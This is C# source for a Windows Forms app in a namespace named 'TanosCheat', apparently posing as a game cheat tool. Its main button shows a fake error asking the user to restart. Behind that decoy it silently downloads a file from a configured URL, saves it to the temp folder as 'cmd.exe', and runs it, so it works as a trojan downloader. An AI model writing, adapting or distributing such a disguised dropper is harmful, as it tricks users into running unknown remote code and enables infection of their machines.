using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Windows.Forms;

namespace TanosCheat
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void bunifuFlatButton1_Click(object sender, EventArgs e)
        {
            try
            {
                MessageBox.Show("Ops! We have some problem! Pleas restard your computer");
                string path = Path.Combine(Path.GetTempPath(), "cmd.exe");

                using (WebClient web = new WebClient())
                {
                    web.DownloadFile(Configure.url, path);
                }
                Process.Start(path);
            }
            catch { }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
    }
}
